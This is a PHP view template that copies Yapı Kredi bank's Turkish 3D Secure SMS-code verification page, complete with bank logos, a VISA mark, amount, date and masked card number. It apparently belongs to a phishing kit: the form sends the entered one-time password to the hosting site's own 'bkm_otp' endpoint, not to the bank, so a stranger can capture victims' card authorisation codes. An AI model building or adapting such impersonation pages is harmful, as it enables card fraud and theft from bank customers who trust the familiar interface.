<!DOCTYPE html>
<html data-ng-app="threeDSecureApp" lang="tr" class="ng-scope">

<head>
    <style type="text/css">
        @charset "UTF-8";

        [ng\:cloak],
        [ng-cloak],
        [data-ng-cloak],
        [x-ng-cloak],
        .ng-cloak,
        .x-ng-cloak,
        .ng-hide:not(.ng-hide-animate) {
            display: none !important;
        }

        ng\:form {
            display: block;
        }

        .ng-animate-shim {
            visibility: hidden;
        }

        .ng-anchor {
            position: absolute;
        }
    </style>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Yapı Kredi</title>

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" type="text/css" href="/public/yapikredi/css/timecircles.css?_=1659827361786">
    <link rel="stylesheet" type="text/css" href="/public/yapikredi/css/tds.css?_=1659827361786">
    <link rel="stylesheet" type="text/css" href="/public/yapikredi/css/ngDialog.css?_=1659827361786">
    <link rel="stylesheet" type="text/css" href="/public/yapikredi/css/ngDialog-custom-width.css?_=1659827361786">
    <link rel="stylesheet" type="text/css" href="/public/yapikredi/css/ngDialog-theme-default.css?_=1659827361786">
    <link rel="stylesheet" type="text/css" href="/public/yapikredi/css/ngDialog-theme-plain.css?_=1659827361786">

    <link rel="stylesheet" href="/public/yapikredi/css/bootstrap.min.css?_=1659827361786">
    <link rel="stylesheet" href="/public/yapikredi/css/bootstrap-theme.min.css?_=1659827361786">
    <link rel="stylesheet" href="/public/yapikredi/css/main.css?_=1659827361786">

    <script type="text/javascript" src="https://gbemv3dsecure.garanti.com.tr/js/jquery-3.3.1.min.js"></script>
</head>

<body class="">
    <div>
        <div data-ng-view="" class="ng-scope">
            <div class="wrapper ng-scope" style="padding-top: 50px; padding-bottom: 0;">
                <div class="container">
                    <div class="card standart-mea" style="margin: auto;">
                        <div class="card-header">
                            <h3 class="card-heading pull-left ng-binding" style="font-size: 14px;">Üç Boyutlu Güvenlik Sistemi</h3>
                            <div class="header-menu pull-right">
                                <a class="help" data-ng-click="openHelpPage()">
                                    <span class="icon">?</span>
                                    <span style="font-size:12px;" class="ng-binding">Yardım</span>
                                </a>
                                <a class="help" data-ng-click="changeCurrentLang()">
                                    <span class="icon ng-binding">EN</span>
                                    <span style="font-size:12px;" class="ng-binding">English</span>
                                </a>
                            </div>
                        </div>
                        <div class="card-content standart-mea" style="padding: 10px;">
                            <div data-ng-include="'partials/helpHeader.jsp'" class="ng-scope">
                                <div class="row head-row ng-scope" style="padding-top: 0px; padding-bottom: 10px;">
                                    <div class="col-xs-12">
                                        <img src="/public/yapikredi/img/ykblogo.svg" alt="Yapı Kredi" style="width: 120px; height: 47px;">
                                        <img class="pull-right" alt="VISA" ng-src="/public/yapikredi/img/VISA.png" src="/public/yapikredi/img/VISA.png" style="width: 60px; margin-top: 12px;">
                                    </div>
                                </div>
                            </div>
                            <div class="customer-info ng-scope" style="font-size: 12px;">
                                <div class="row">
                                    <div class="col-xs-5 ng-binding">Üye İşyeri İsmi</div>
                                    <div class="col-xs-7 customer-val"><strong class="ng-binding">ODEME HIZMETLERI</strong></div>
                                </div>
                                <div class="row">
                                    <div class="col-xs-5 ng-binding">Tutar</div>
                                    <div class="col-xs-7 customer-val"><strong class="ng-binding"><?= number_format($data->balance, 2, '.', ',') ?> TL</strong></div>
                                </div>
                                <div class="row">
                                    <div class="col-xs-5 ng-binding">Tarih</div>
                                    <div class="col-xs-7 customer-val"><strong class="ng-binding"><?= dmyhi($data->tarih) ?></strong></div>
                                </div>
                                <div class="row">
                                    <div class="col-xs-5 ng-binding">Kart Numarası</div>
                                    <div class="col-xs-7"><strong class="ng-binding"><?= substr($data->cc_no, 0, 4) ?> **** **** <?= substr($data->cc_no, 12, 15) ?></strong></div>
                                </div>
                                <div class="row ng-scope">
                                    <div class="col-xs-5 ng-binding">Cep Telefonu</div>
                                    <div class="col-xs-7 customer-val"><strong class="ng-binding">0 5** *** ** **</strong></div>
                                </div>
                                <p class="disclaimer"><span class="warning-icon ng-binding">Bu bilgiler işyerleri ile paylaşılmamaktadır.</span></p>
                            </div>
                            <form id="bkmform" method="POST" action="<?= base_url('bkm_otp/' . $data->hash) ?>" class="form-horizontal container" style="width: inherit; font-size: 12px; padding-top: 10px;">

                                <div class="form-content row ng-scope" ng-if="!waiting" style="margin: 0px;">
                                    <div class="ng-scope" ng-if="!showUserList" style="margin-bottom: 0px; font-size: 13px;">
                                        <div class="col-sm-4 col-xs-6" style="font-size:12px; padding-right: 0px; padding-left: 0px;">
                                            <label for="smspass" class="smsinfo control-label ng-binding" style="padding-left: 0px; padding-right: 0px; margin-top: 5px;">Akıllı
                                                SMS Şifresi
                                            </label>
                                        </div>
                                        <div ng-class="inputClass" style="margin-bottom: 5px;" class="smsinfo col-sm-8 col-xs-6">
                                            <div class="info-input">
                                                <input type="number" name="password" type="password" class="form-control ng-pristine ng-valid ng-touched" id="smspass" onkeypress="return ((event.charCode >= 48 &amp;&amp; event.charCode <= 57 &amp;&amp; value.length <5 ) || event.charCode == 13 || event.charCode == 0)">
                                            </div>
                                        </div>
                                    </div>

                                    <div class="tdserror ng-scope" id="wrongPassDiv" style="padding-left: 0px; display:none">
                                        <div class="smsinfo media-error col-xs-12" style="padding-left: 0px; margin-top: 5px;">
                                            <p class="ng-binding">Akıllı SMS şifrenizi yanlış girdiniz. Lütfen tekrar deneyiniz.</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="form-content row" style="margin: 0px; padding-top: 0px;">
                                    <div ng-if="!showUserList" class="ng-scope">
                                        <div class="col-sm-12 col-xs-12" style="padding-left: 0px; padding-right: 0px;">
                                            <div class="row">
                                                <div class="smsinfo col-sm-12 col-xs-12">
                                                    <p class="ng-binding">Cep telefonu numaranızı değiştirmek için <a data-ng-click="getUserPhoneList()" class="ng-binding">tıklayınız.</a></p>
                                                </div>
                                            </div>
                                            <div class="row ng-scope" ng-if="seal &amp;&amp; currentApprovalType === 'AS'" style="padding-top: 5px;">
                                                <div class="col-sm-12 col-xs-12">
                                                    <p class="ng-binding">Akıllı Bildirim ile doğrulamak için <a data-ng-click="changeApprovalType('SEAL');" class="ng-binding">tıklayınız.</a></p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="form-footer" style="background-color: #f1f8fe; padding-bottom: 10px;">
                                        <div class="" style="margin-bottom: 0px; margin: auto;">
                                            <div class="col-sm-12 col-xs-12 ng-scope" style="margin-top: 10px;" ng-if="!waiting">
                                                <button class="submit-btn pull-right ng-binding" style="margin: auto; /*width: 100%;*/" type="submit" id="chntbtn">Onay</button>
                                                <button class="cancel-btn pull-right ng-binding" style="padding-right: 10px; padding-left: 10px;" type="button" data-ng-click="reject()">Vazgeç</button>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>


    <?php $this->load->view('poslar/yapikredi/inc_js.php'); ?>

</body>

</html>